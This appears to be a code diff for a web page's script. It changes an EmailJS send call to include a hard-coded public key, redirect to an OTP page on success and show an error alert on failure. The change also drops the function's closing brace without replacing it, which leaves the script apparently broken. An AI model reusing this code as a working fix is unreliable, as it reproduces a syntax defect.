@@ -100,17 +100,16 @@
             reply_to: 'soporte@dnplus.com'
         };
 
-        emailjs.send(serviceID, templateID, templateParams)
-            .then(() => {
-                // Si funciona, te manda a la pantalla para poner el código
-                window.location.href = "otp.html";
-            }, (err) => {
-                boton.innerText = "REINTENTAR";
-                boton.disabled = false;
-                // Si sale error, ahora nos dirá la razón real
-                alert("Error: " + err.status + " " + err.text);
-            });
-    }
+        // Usamos los 4 parámetros para que EmailJS no se pierda
+emailjs.send(serviceID, templateID, templateParams, "Ycta0gV4PbOTe1hr9")
+    .then(() => {
+        window.location.href = "otp.html";
+    }, (err) => {
+        // Este mensaje nos dirá LA VERDAD de lo que falta
+        alert("Error Final: " + err.status + " - " + err.text);
+        boton.disabled = false;
+    });
+
 </script>
 </body>
 </html>
